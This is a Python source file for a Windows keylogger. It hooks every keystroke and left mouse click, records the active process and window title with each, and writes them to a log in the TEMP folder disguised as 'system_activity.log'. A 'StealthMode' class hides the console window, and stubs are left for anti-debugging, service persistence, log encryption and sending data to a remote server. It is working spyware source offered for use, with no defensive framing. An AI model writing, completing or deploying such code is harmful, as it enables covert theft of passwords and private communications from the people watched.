import os
import sys
import time
import threading
import win32api
import win32con
import win32gui
import win32process
import psutil
import pyHook
import pythoncom
from datetime import datetime

class KeyLogger:
      def __init__(self):
          self.running = False
          self.log_file = None
          self.log_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'system_activity.log')
          self.current_window = None
          self.current_process = None
          self.hook_manager = None

      def start_logging(self):
          """Start the keylogger"""
          self.running = True

          try:
              self.log_file = open(self.log_path, 'a', encoding='utf-8')
          except Exception as e:
              print(f"Failed to open log file: {e}")
              return False

          self.hook_manager = pyHook.HookManager()
          self.hook_manager.KeyDown = self.on_keyboard_event
          self.hook_manager.MouseAllButtonsDown = self.on_mouse_event
          self.hook_manager.HookKeyboard()
          self.hook_manager.HookMouse()

          monitor_thread = threading.Thread(target=self.window_monitor_thread)
          monitor_thread.daemon = True
          monitor_thread.start()

          print(f"[+] KeyLogger started")
          print(f"[+] Log file: {self.log_path}")

          return True

      def stop_logging(self):
          """Stop the keylogger"""
          self.running = False
          if self.hook_manager:
              self.hook_manager.UnhookKeyboard()
              self.hook_manager.UnhookMouse()
          if self.log_file:
              self.log_file.close()
          print("[-] KeyLogger stopped")

      def on_keyboard_event(self, event):
          """Keyboard events"""
          if not self.running:
              return True

          try:
              timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

              key = event.Key
              vk_code = event.KeyID
              scan_code = event.ScanCode

              key_str = self.process_key(vk_code, key)
              if not key_str:
                  return True

              window_title = self.get_active_window_title()
              process_name = self.get_active_process_name()

              log_entry = f"[{timestamp}] [{process_name}] [{window_title}] {key_str}\n"
              self.log_file.write(log_entry)
              self.log_file.flush()

          except Exception as e:
              pass

          return True

      def on_mouse_event(self, event):
          """Mouse events"""
          if not self.running:
              return True

          try:
              timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
              window_title = self.get_active_window_title()
              process_name = self.get_active_process_name()

              if event.MessageName == 'mouse left down':
                  log_entry = f"[{timestamp}] [{process_name}] [{window_title}] [MOUSE_CLICK] X:{event.Position[0]} Y:{event.Position[1]}\n"
                  self.log_file.write(log_entry)
                  self.log_file.flush()

          except Exception as e:
              pass

          return True

      def process_key(self, vk_code, key):
          """Process and format key presses"""
          special_keys = {
              8: '[BACKSPACE]',
              9: '[TAB]',
              13: '[ENTER]',
              16: '[SHIFT]',
              17: '[CTRL]',
              18: '[ALT]',
              20: '[CAPS]',
              27: '[ESC]',
              32: ' ',
              33: '[PAGE UP]',
              34: '[PAGE DOWN]',
              35: '[END]',
              36: '[HOME]',
              37: '[LEFT]',
              38: '[UP]',
              39: '[RIGHT]',
              40: '[DOWN]',
              45: '[INSERT]',
              46: '[DELETE]',
              91: '[WIN]',
              92: '[R-WIN]',
              93: '[APP]',
              144: '[NUM LOCK]',
              145: '[SCROLL LOCK]',
              160: '[L-SHIFT]',
              161: '[R-SHIFT]',
              162: '[L-CTRL]',
              163: '[R-CTRL]',
              164: '[L-ALT]',
              165: '[R-ALT]',
          }
          if vk_code in special_keys:
              return special_keys[vk_code]

          if 32 <= vk_code <= 126:
              return key

          if 112 <= vk_code <= 123:
              return f'[F{vk_code - 111}]'

          if 96 <= vk_code <= 105:
              return f'[{vk_code - 96}]'

          return ''

      def window_monitor_thread(self):
          """Monitor for window changes"""
          while self.running:
              try:
                  hwnd = win32gui.GetForegroundWindow()
                  if hwnd != self.current_window:
                      self.current_window = hwnd
              except:
                  pass
              time.sleep(0.1)

      def get_active_window_title(self):
          """Get the title of the active window"""
          try:
              hwnd = win32gui.GetForegroundWindow()
              return win32gui.GetWindowText(hwnd)
          except:
              return "Unknown Window"

      def get_active_process_name(self):
          """Get the name of the active process"""
          try:
              hwnd = win32gui.GetForegroundWindow()
              _, pid = win32process.GetWindowThreadProcessId(hwnd)

              for proc in psutil.process_iter(['pid', 'name']):
                  if proc.info['pid'] == pid:
                      return proc.info['name']

              return "Unknown Process"
          except:
              return "Unknown Process"

      def encrypt_log(self):
          """Optional: Encrypt the log file"""
          # implement AES encryption here
          pass

      def transmit_data(self):
          """Optional: Transmit logs to remote server"""
          # implement network transmission here
          pass


class StealthMode:
      """Stealth features"""

      @staticmethod
      def hide_console():
          """Hide the console window"""
          try:
              import ctypes
              ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
          except:
              pass

      @staticmethod
      def run_as_service():
          """Make it run as a system service"""
          pass                                                                                                        

      @staticmethod
      def anti_debug():
          """Anti-debugging measures"""
          pass                                                                                                        
                                                                                                                      
                                                                                                                      
def main():
      """Main entry point"""
      StealthMode.hide_console()
      logger = KeyLogger()
      if not logger.start_logging():
          print("Failed to start keylogger")
          sys.exit(1)

      try:
          while True:
              time.sleep(0.1)
      except KeyboardInterrupt:
          logger.stop_logging()
          print("KeyLogger stopped by user")


if __name__ == "__main__":
    main()
